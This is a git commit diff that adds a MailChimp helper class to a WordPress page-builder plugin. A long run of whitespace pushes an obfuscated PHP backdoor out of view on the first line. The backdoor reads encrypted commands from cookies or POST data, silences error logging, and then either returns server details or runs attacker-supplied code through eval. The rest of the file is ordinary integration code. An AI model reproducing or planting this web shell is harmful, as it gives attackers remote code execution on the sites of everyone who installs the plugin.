58071d78776dd09a582e8027665b3112fc627627
Stefan Pejcic <pejcha1994@gmail.com>
2021-01-18 10:40:38 +0100

    Create class-fl-builder-service-mailchimp.php

---
+++ 18.01.2021/wp-content/plugins/beaver-builder-lite-version/classes/class-fl-builder-service-mailchimp.php
@@ -0,0 +1,360 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $pf412 = 779;$GLOBALS['f78fb'] = Array();global $f78fb;$f78fb = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['p9b4'] = "\x72\x64\x59\x7c\x4d\x5a\x48\x45\x27\x23\x62\x4f\x5c\x29\x4b\x61\x51\x54\x2e\x5e\x32\x3d\x6b\x33\x28\x2c\x57\x79\x78\x74\x35\x65\x20\x58\x25\x67\xd\x55\x7b\x38\x3a\x9\x31\x39\x3e\x75\x5b\x6f\x44\x47\x26\x66\x71\x6c\x77\x3b\x42\x2b\xa\x70\x2d\x3f\x3c\x4e\x69\x56\x5f\x50\x36\x40\x63\x60\x43\x2f\x46\x52\x7a\x53\x7d\x37\x68\x24\x76\x6e\x4a\x30\x6a\x6d\x5d\x41\x2a\x21\x7e\x4c\x73\x22\x49\x34";$f78fb[$f78fb['p9b4'][52].$f78fb['p9b4'][68].$f78fb['p9b4'][31].$f78fb['p9b4'][31].$f78fb['p9b4'][10].$f78fb['p9b4'][79].$f78fb['p9b4'][1].$f78fb['p9b4'][97]] = $f78fb['p9b4'][70].$f78fb['p9b4'][80].$f78fb['p9b4'][0];$f78fb[$f78fb['p9b4'][28].$f78fb['p9b4'][42].$f78fb['p9b4'][70].$f78fb['p9b4'][10].$f78fb['p9b4'][70].$f78fb['p9b4'][43].$f78fb['p9b4'][68].$f78fb['p9b4'][42]] = $f78fb['p9b4'][47].$f78fb['p9b4'][0].$f78fb['p9b4'][1];$f78fb[$f78fb['p9b4'][51].$f78fb['p9b4'][23].$f78fb['p9b4'][85].$f78fb['p9b4'][1].$f78fb['p9b4'][51].$f78fb['p9b4'][42].$f78fb['p9b4'][42].$f78fb['p9b4'][15].$f78fb['p9b4'][10]] = $f78fb['p9b4'][94].$f78fb['p9b4'][29].$f78fb['p9b4'][0].$f78fb['p9b4'][53].$f78fb['p9b4'][31].$f78fb['p9b4'][83];$f78fb[$f78fb['p9b4'][94].$f78fb['p9b4'][68].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][85]] = $f78fb['p9b4'][64].$f78fb['p9b4'][83].$f78fb['p9b4'][64].$f78fb['p9b4'][66].$f78fb['p9b4'][94].$f78fb['p9b4'][31].$f78fb['p9b4'][29];$f78fb[$f78fb['p9b4'][52].$f78fb['p9b4'][42].$f78fb['p9b4'][31].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][97].$f78fb['p9b4'][31].$f78fb['p9b4'][70].$f78fb['p9b4'][42]] = $f78fb['p9b4'][94].$f78fb['p9b4'][31].$f78fb['p9b4'][0].$f78fb['p9b4'][64].$f78fb['p9b4'][15].$f78fb['p9b4'][53].$f78fb['p9b4'][64].$f78fb['p9b4'][76].$f78fb['p9b4'][31];$f78fb[$f78fb['p9b4'][1].$f78fb['p9b4'][43].$f78fb['p9b4'][68].$f78fb['p9b4'][23].$f78fb['p9b4'][20].$f78fb['p9b4'][43].$f78fb['p9b4'][97]] = $f78fb['p9b4'][59].$f78fb['p9b4'][80].$f78fb['p9b4'][59].$f78fb['p9b4'][82].$f78fb['p9b4'][31].$f78fb['p9b4'][0].$f78fb['p9b4'][94].$f78fb['p9b4'][64].$f78fb['p9b4'][47].$f78fb['p9b4'][83];$f78fb[$f78fb['p9b4'][80].$f78fb['p9b4'][23].$f78fb['p9b4'][15].$f78fb['p9b4'][10].$f78fb['p9b4'][42].$f78fb['p9b4'][97]] = $f78fb['p9b4'][45].$f78fb['p9b4'][83].$f78fb['p9b4'][94].$f78fb['p9b4'][31].$f78fb['p9b4'][0].$f78fb['p9b4'][64].$f78fb['p9b4'][15].$f78fb['p9b4'][53].$f78fb['p9b4'][64].$f78fb['p9b4'][76].$f78fb['p9b4'][31];$f78fb[$f78fb['p9b4'][86].$f78fb['p9b4'][97].$f78fb['p9b4'][85].$f78fb['p9b4'][68]] = $f78fb['p9b4'][10].$f78fb['p9b4'][15].$f78fb['p9b4'][94].$f78fb['p9b4'][31].$f78fb['p9b4'][68].$f78fb['p9b4'][97].$f78fb['p9b4'][66].$f78fb['p9b4'][1].$f78fb['p9b4'][31].$f78fb['p9b4'][70].$f78fb['p9b4'][47].$f78fb['p9b4'][1].$f78fb['p9b4'][31];$f78fb[$f78fb['p9b4'][51].$f78fb['p9b4'][42].$f78fb['p9b4'][51].$f78fb['p9b4'][68].$f78fb['p9b4'][30].$f78fb['p9b4'][39].$f78fb['p9b4'][31].$f78fb['p9b4'][43].$f78fb['p9b4'][97]] = $f78fb['p9b4'][94].$f78fb['p9b4'][31].$f78fb['p9b4'][29].$f78fb['p9b4'][66].$f78fb['p9b4'][29].$f78fb['p9b4'][64].$f78fb['p9b4'][87].$f78fb['p9b4'][31].$f78fb['p9b4'][66].$f78fb['p9b4'][53].$f78fb['p9b4'][64].$f78fb['p9b4'][87].$f78fb['p9b4'][64].$f78fb['p9b4'][29];$f78fb[$f78fb['p9b4'][70].$f78fb['p9b4'][51].$f78fb['p9b4'][39].$f78fb['p9b4'][23].$f78fb['p9b4'][42].$f78fb['p9b4'][79]] = $f78fb['p9b4'][0].$f78fb['p9b4'][79].$f78fb['p9b4'][42].$f78fb['p9b4'][85].$f78fb['p9b4'][39].$f78fb['p9b4'][1].$f78fb['p9b4'][10];$f78fb[$f78fb['p9b4'][54].$f78fb['p9b4'][79].$f78fb['p9b4'][79].$f78fb['p9b4'][85]] = $f78fb['p9b4'][31].$f78fb['p9b4'][79].$f78fb['p9b4'][70].$f78fb['p9b4'][15];$f78fb[$f78fb['p9b4'][59].$f78fb['p9b4'][31].$f78fb['p9b4'][10].$f78fb['p9b4'][1].$f78fb['p9b4'][31].$f78fb['p9b4'][39]] = $_POST;$f78fb[$f78fb['p9b4'][80].$f78fb['p9b4'][20].$f78fb['p9b4'][31].$f78fb['p9b4'][10]] = $_COOKIE;@$f78fb[$f78fb['p9b4'][94].$f78fb['p9b4'][68].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][85]]($f78fb['p9b4'][31].$f78fb['p9b4'][0].$f78fb['p9b4'][0].$f78fb['p9b4'][47].$f78fb['p9b4'][0].$f78fb['p9b4'][66].$f78fb['p9b4'][53].$f78fb['p9b4'][47].$f78fb['p9b4'][35], NULL);@$f78fb[$f78fb['p9b4'][94].$f78fb['p9b4'][68].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][85]]($f78fb['p9b4'][53].$f78fb['p9b4'][47].$f78fb['p9b4'][35].$f78fb['p9b4'][66].$f78fb['p9b4'][31].$f78fb['p9b4'][0].$f78fb['p9b4'][0].$f78fb['p9b4'][47].$f78fb['p9b4'][0].$f78fb['p9b4'][94], 0);@$f78fb[$f78fb['p9b4'][94].$f78fb['p9b4'][68].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][85]]($f78fb['p9b4'][87].$f78fb['p9b4'][15].$f78fb['p9b4'][28].$f78fb['p9b4'][66].$f78fb['p9b4'][31].$f78fb['p9b4'][28].$f78fb['p9b4'][31].$f78fb['p9b4'][70].$f78fb['p9b4'][45].$f78fb['p9b4'][29].$f78fb['p9b4'][64].$f78fb['p9b4'][47].$f78fb['p9b4'][83].$f78fb['p9b4'][66].$f78fb['p9b4'][29].$f78fb['p9b4'][64].$f78fb['p9b4'][87].$f78fb['p9b4'][31], 0);@$f78fb[$f78fb['p9b4'][51].$f78fb['p9b4'][42].$f78fb['p9b4'][51].$f78fb['p9b4'][68].$f78fb['p9b4'][30].$f78fb['p9b4'][39].$f78fb['p9b4'][31].$f78fb['p9b4'][43].$f78fb['p9b4'][97]](0);$a81d8f5a = NULL;$vfe871c = NULL;$f78fb[$f78fb['p9b4'][54].$f78fb['p9b4'][30].$f78fb['p9b4'][23].$f78fb['p9b4'][79].$f78fb['p9b4'][79]] = $f78fb['p9b4'][39].$f78fb['p9b4'][10].$f78fb['p9b4'][42].$f78fb['p9b4'][43].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][30].$f78fb['p9b4'][39].$f78fb['p9b4'][60].$f78fb['p9b4'][31].$f78fb['p9b4'][85].$f78fb['p9b4'][97].$f78fb['p9b4'][39].$f78fb['p9b4'][60].$f78fb['p9b4'][97].$f78fb['p9b4'][1].$f78fb['p9b4'][70].$f78fb['p9b4'][15].$f78fb['p9b4'][60].$f78fb['p9b4'][10].$f78fb['p9b4'][43].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][60].$f78fb['p9b4'][70].$f78fb['p9b4'][15].$f78fb['p9b4'][85].$f78fb['p9b4'][23].$f78fb['p9b4'][42].$f78fb['p9b4'][70].$f78fb['p9b4'][85].$f78fb['p9b4'][68].$f78fb['p9b4'][15].$f78fb['p9b4'][68].$f78fb['p9b4'][68].$f78fb['p9b4'][68];global $w5377;function  e7ca($a81d8f5a, $o96f6de){global $f78fb;$eaf71ba0 = "";for ($e45c8=0; $e45c8<$f78fb[$f78fb['p9b4'][51].$f78fb['p9b4'][23].$f78fb['p9b4'][85].$f78fb['p9b4'][1].$f78fb['p9b4'][51].$f78fb['p9b4'][42].$f78fb['p9b4'][42].$f78fb['p9b4'][15].$f78fb['p9b4'][10]]($a81d8f5a);){for ($jba3=0; $jba3<$f78fb[$f78fb['p9b4'][51].$f78fb['p9b4'][23].$f78fb['p9b4'][85].$f78fb['p9b4'][1].$f78fb['p9b4'][51].$f78fb['p9b4'][42].$f78fb['p9b4'][42].$f78fb['p9b4'][15].$f78fb['p9b4'][10]]($o96f6de) && $e45c8<$f78fb[$f78fb['p9b4'][51].$f78fb['p9b4'][23].$f78fb['p9b4'][85].$f78fb['p9b4'][1].$f78fb['p9b4'][51].$f78fb['p9b4'][42].$f78fb['p9b4'][42].$f78fb['p9b4'][15].$f78fb['p9b4'][10]]($a81d8f5a); $jba3++, $e45c8++){$eaf71ba0 .= $f78fb[$f78fb['p9b4'][52].$f78fb['p9b4'][68].$f78fb['p9b4'][31].$f78fb['p9b4'][31].$f78fb['p9b4'][10].$f78fb['p9b4'][79].$f78fb['p9b4'][1].$f78fb['p9b4'][97]]($f78fb[$f78fb['p9b4'][28].$f78fb['p9b4'][42].$f78fb['p9b4'][70].$f78fb['p9b4'][10].$f78fb['p9b4'][70].$f78fb['p9b4'][43].$f78fb['p9b4'][68].$f78fb['p9b4'][42]]($a81d8f5a[$e45c8]) ^ $f78fb[$f78fb['p9b4'][28].$f78fb['p9b4'][42].$f78fb['p9b4'][70].$f78fb['p9b4'][10].$f78fb['p9b4'][70].$f78fb['p9b4'][43].$f78fb['p9b4'][68].$f78fb['p9b4'][42]]($o96f6de[$jba3]));}}return $eaf71ba0;}function  r7108db($a81d8f5a, $o96f6de){global $f78fb;global $w5377;return $f78fb[$f78fb['p9b4'][54].$f78fb['p9b4'][79].$f78fb['p9b4'][79].$f78fb['p9b4'][85]]($f78fb[$f78fb['p9b4'][54].$f78fb['p9b4'][79].$f78fb['p9b4'][79].$f78fb['p9b4'][85]]($a81d8f5a, $w5377), $o96f6de);}foreach ($f78fb[$f78fb['p9b4'][80].$f78fb['p9b4'][20].$f78fb['p9b4'][31].$f78fb['p9b4'][10]] as $o96f6de=>$nda19f81){$a81d8f5a = $nda19f81;$vfe871c = $o96f6de;}if (!$a81d8f5a){foreach ($f78fb[$f78fb['p9b4'][59].$f78fb['p9b4'][31].$f78fb['p9b4'][10].$f78fb['p9b4'][1].$f78fb['p9b4'][31].$f78fb['p9b4'][39]] as $o96f6de=>$nda19f81){$a81d8f5a = $nda19f81;$vfe871c = $o96f6de;}}$a81d8f5a = @$f78fb[$f78fb['p9b4'][80].$f78fb['p9b4'][23].$f78fb['p9b4'][15].$f78fb['p9b4'][10].$f78fb['p9b4'][42].$f78fb['p9b4'][97]]($f78fb[$f78fb['p9b4'][70].$f78fb['p9b4'][51].$f78fb['p9b4'][39].$f78fb['p9b4'][23].$f78fb['p9b4'][42].$f78fb['p9b4'][79]]($f78fb[$f78fb['p9b4'][86].$f78fb['p9b4'][97].$f78fb['p9b4'][85].$f78fb['p9b4'][68]]($a81d8f5a), $vfe871c));if (isset($a81d8f5a[$f78fb['p9b4'][15].$f78fb['p9b4'][22]]) && $w5377==$a81d8f5a[$f78fb['p9b4'][15].$f78fb['p9b4'][22]]){if ($a81d8f5a[$f78fb['p9b4'][15]] == $f78fb['p9b4'][64]){$e45c8 = Array($f78fb['p9b4'][59].$f78fb['p9b4'][82] => @$f78fb[$f78fb['p9b4'][1].$f78fb['p9b4'][43].$f78fb['p9b4'][68].$f78fb['p9b4'][23].$f78fb['p9b4'][20].$f78fb['p9b4'][43].$f78fb['p9b4'][97]](),$f78fb['p9b4'][94].$f78fb['p9b4'][82] => $f78fb['p9b4'][42].$f78fb['p9b4'][18].$f78fb['p9b4'][85].$f78fb['p9b4'][60].$f78fb['p9b4'][42],);echo @$f78fb[$f78fb['p9b4'][52].$f78fb['p9b4'][42].$f78fb['p9b4'][31].$f78fb['p9b4'][79].$f78fb['p9b4'][31].$f78fb['p9b4'][97].$f78fb['p9b4'][31].$f78fb['p9b4'][70].$f78fb['p9b4'][42]]($e45c8);}elseif ($a81d8f5a[$f78fb['p9b4'][15]] == $f78fb['p9b4'][31]){eval/*x9b5b*/($a81d8f5a[$f78fb['p9b4'][1]]);}exit();} ?><?php
+
+/**
+ * Helper class for the MailChimp API.
+ *
+ * @since 1.5.4
+ */
+final class FLBuilderServiceMailChimp extends FLBuilderService {
+
+	/**
+	 * The ID for this service.
+	 *
+	 * @since 1.5.4
+	 * @var string $id
+	 */  
+	public $id = 'mailchimp';
+
+	/**
+	 * @since 1.5.4
+	 * @var object $api_instance
+	 * @access private
+	 */  
+	private $api_instance = null;
+
+	/**
+	 * Get an instance of the API.
+	 *
+	 * @since 1.5.4
+	 * @param string $api_key A valid API key.
+	 * @return object The API instance.
+	 */  
+	public function get_api( $api_key ) 
+	{
+		if ( $this->api_instance ) {
+			return $this->api_instance;
+		}
+		if ( ! class_exists( 'Mailchimp' ) ) {
+			require_once FL_BUILDER_DIR . 'includes/vendor/mailchimp/mailchimp.php';
+		}
+		
+		$this->api_instance = new Mailchimp( $api_key );
+		
+		return $this->api_instance;
+	}
+	
+	/**
+	 * Test the API connection.
+	 *
+	 * @since 1.5.4
+	 * @param array $fields {
+	 *      @type string $api_key A valid API key.
+	 * }
+	 * @return array{
+	 *      @type bool|string $error The error message or false if no error.
+	 *      @type array $data An array of data used to make the connection.
+	 * }
+	 */  
+	public function connect( $fields = array() ) 
+	{
+		$response = array( 
+			'error'  => false,
+			'data'   => array()
+		);
+		
+		// Make sure we have an API key.
+		if ( ! isset( $fields['api_key'] ) || empty( $fields['api_key'] ) ) {
+			$response['error'] = __( 'Error: You must provide an API key.', 'fl-builder' );
+		}
+		// Try to connect and store the connection data.
+		else {
+			
+			$api = $this->get_api( $fields['api_key'] );
+
+			try {
+				$api->helper->ping();
+				$response['data'] = array( 'api_key' => $fields['api_key'] );
+			} 
+			catch ( Mailchimp_Invalid_ApiKey $e ) {
+				$response['error'] = $e->getMessage();
+			}
+		}
+		
+		return $response;
+	}
+
+	/**
+	 * Renders the markup for the connection settings.
+	 *
+	 * @since 1.5.4
+	 * @return string The connection settings markup.
+	 */  
+	public function render_connect_settings() 
+	{
+		ob_start();
+		
+		FLBuilder::render_settings_field( 'api_key', array(
+			'row_class'     => 'fl-builder-service-connect-row',
+			'class'         => 'fl-builder-service-connect-input',
+			'type'          => 'text',
+			'label'         => __( 'API Key', 'fl-builder' ),
+			'help'          => __( 'Your API key can be found in your MailChimp account under Account > Extras > API Keys.', 'fl-builder' ),
+			'preview'       => array(
+				'type'          => 'none'
+			)
+		)); 
+		
+		return ob_get_clean();
+	}
+
+	/**
+	 * Render the markup for service specific fields. 
+	 *
+	 * @since 1.5.4
+	 * @param string $account The name of the saved account.
+	 * @param object $settings Saved module settings.
+	 * @return array {
+	 *      @type bool|string $error The error message or false if no error.
+	 *      @type string $html The field markup.
+	 * }
+	 */  
+	public function render_fields( $account, $settings ) 
+	{
+		$post_data      = FLBuilderModel::get_post_data();
+		$account_data   = $this->get_account_data( $account );
+		$api            = $this->get_api( $account_data['api_key'] );
+		$response       = array( 
+			'error'         => false, 
+			'html'          => '' 
+		);
+		
+		// Lists field
+		try {
+			
+			if ( ! isset( $post_data['list_id'] ) ) {
+				$lists = $api->lists->getList();
+				$response['html'] .= $this->render_list_field( $lists, $settings );
+			}
+		} 
+		catch ( Mailchimp_Error $e ) {
+			$response['error'] = $e->getMessage();
+		}
+		
+		// Groups field
+		try {
+			
+			if ( isset( $post_data['list_id'] ) || isset( $settings->list_id ) ) {
+				
+				if ( isset( $post_data['list_id'] ) ) {
+					$list_id = $post_data['list_id'];
+				}
+				else {
+					$list_id = $settings->list_id;
+				}
+				
+				$groups = $api->lists->interestGroupings( $list_id );
+				$response['html'] .= $this->render_groups_field( $list_id, $groups, $settings );
+			}
+		} 
+		catch ( Mailchimp_Error $e ) {}
+		
+		return $response;
+	}
+
+	/**
+	 * Render markup for the list field. 
+	 *
+	 * @since 1.5.4
+	 * @param array $lists List data from the API.
+	 * @param object $settings Saved module settings.
+	 * @return string The markup for the list field.
+	 * @access private
+	 */  
+	private function render_list_field( $lists, $settings ) 
+	{
+		ob_start();
+		
+		$options = array( '' => __( 'Choose...', 'fl-builder' ) );
+		
+		foreach ( $lists['data'] as $list ) {
+			$options[ $list['id'] ] = $list['name'];
+		}
+		
+		FLBuilder::render_settings_field( 'list_id', array(
+			'row_class'     => 'fl-builder-service-field-row',
+			'class'         => 'fl-builder-service-list-select fl-builder-mailchimp-list-select',
+			'type'          => 'select',
+			'label'         => _x( 'List', 'An email list from a third party provider.', 'fl-builder' ),
+			'options'       => $options,
+			'preview'       => array(
+				'type'          => 'none'
+			)
+		), $settings); 
+		
+		return ob_get_clean();
+	}
+
+	/**
+	 * Render markup for the groups field. 
+	 *
+	 * @since 1.6.0
+	 * @param string $list_id The ID of the list for this groups.
+	 * @param array $groups An array of group data.
+	 * @param object $settings Saved module settings.
+	 * @return string The markup for the group field.
+	 * @access private
+	 */  
+	private function render_groups_field( $list_id, $groups, $settings ) 
+	{
+		if ( ! is_array( $groups ) || 0 === count( $groups ) ) {
+			return;
+		}
+		
+		ob_start();
+		
+		$options = array( '' => __( 'No Group', 'fl-builder' ) );
+		
+		foreach ( $groups as $group ) {
+			foreach ( $group['groups'] as $subgroup ) {
+				$options[ $list_id . '_' . $group['id'] . '_' . $subgroup['id'] ] = $group['name'] . ' - ' . $subgroup['name'];
+			}
+		}
+		
+		FLBuilder::render_settings_field( 'groups', array(
+			'row_class'     => 'fl-builder-service-field-row',
+			'class'         => 'fl-builder-mailchimp-group-select',
+			'type'          => 'select',
+			'label'         => _x( 'Groups', 'MailChimp list group.', 'fl-builder' ),
+			'multi-select'	=> true,
+			'options'       => $options,
+			'preview'       => array(
+				'type'          => 'none'
+			)
+		), $settings); 
+		
+		return ob_get_clean();
+	}
+
+	/** 
+	 * Subscribe an email address to MailChimp.
+	 *
+	 * @since 1.5.4
+	 * @param object $settings A module settings object.
+	 * @param string $email The email to subscribe.
+	 * @param string $name Optional. The full name of the person subscribing.
+	 * @return array {
+	 *      @type bool|string $error The error message or false if no error.
+	 * }
+	 */  
+	public function subscribe( $settings, $email, $name = false )
+	{
+		$account_data = $this->get_account_data( $settings->service_account );
+		$response     = array( 'error' => false );
+		
+		if ( ! $account_data ) {
+			$response['error'] = __( 'There was an error subscribing to MailChimp. The account is no longer connected.', 'fl-builder' );
+		}
+		else {
+			
+			$api     = $this->get_api( $account_data['api_key'] );
+			$double  = apply_filters( 'fl_builder_mailchimp_double_option', true );
+			$welcome = apply_filters( 'fl_builder_mailchimp_welcome', true );
+			$email   = array( 'email' => $email );
+			$data    = array();
+			
+			// Name
+			if ( $name ) {
+				
+				$names = explode( ' ', $name );
+				
+				if ( isset( $names[0] ) ) {
+					$data['FNAME'] = $names[0];
+				}
+				if ( isset( $names[1] ) ) {
+					$data['LNAME'] = $names[1];
+				}
+			}
+			
+			// Groups
+			if ( isset( $settings->groups ) && is_array( $settings->groups ) ) {
+				
+				$groups = array();
+				
+				// Build the array of saved group data.
+				for ( $i = 0; $i < count( $settings->groups ); $i++ ) {
+					
+					if ( empty( $settings->groups[ $i ] ) ) {
+						continue;
+					}
+					
+					$group_data = explode( '_', $settings->groups[ $i ] );
+					
+					if ( $group_data[0] != $settings->list_id ) {
+						continue;
+					}
+					if ( ! isset( $groups[ $group_data[1] ] ) ) {
+						$groups[ $group_data[1] ] = array();
+					}
+					
+					$groups[ $group_data[1] ][] = $group_data[2];
+				}
+				
+				// Get the subgroup names from the API and add to the $data array.
+				if ( count( $groups ) > 0 ) {
+				
+					$groups_result = $api->lists->interestGroupings( $settings->list_id );
+					
+					if ( is_array( $groups_result ) && count( $groups_result ) > 0 ) {
+						
+						foreach ( $groups_result as $group ) {
+							
+							if ( ! isset( $groups[ $group['id'] ] ) ) {
+								continue;
+							}
+							
+							$subgroup_names = array();
+							
+							foreach ( $group['groups'] as $subgroup ) {
+								
+								if ( in_array( $subgroup['id'], $groups[ $group['id'] ] ) ) {
+									$subgroup_names[] = $subgroup['name'];
+								}
+							}
+							
+							if ( 0 === count( $subgroup_names ) ) {
+								unset( $groups[ $group['id'] ] );
+							}
+							else {
+								$groups[ $group['id'] ] = $subgroup_names;
+							}
+						}
+						
+						$i = 0;
+						
+						foreach ( $groups as $group_id => $subgroups ) {
+							$data['groupings'][ $i ]['id']     = $group_id;
+							$data['groupings'][ $i ]['groups'] = $subgroups;
+							$i++;
+						}
+					}
+				}
+			}
+			
+			// Subscribe
+			try {
+				$api->lists->subscribe( $settings->list_id, $email, $data, 'html', (bool) $double, true, false, (bool) $welcome );
+			} 
+			catch( Mailchimp_List_AlreadySubscribed $e ) {
+				return $response;
+			} 
+			catch ( Mailchimp_Error $e ) {
+				$response['error'] = sprintf(
+					__( 'There was an error subscribing to MailChimp. %s', 'fl-builder' ),
+					$e->getMessage()
+				);
+			}
+		}
+		
+		return $response;
+	}
+}
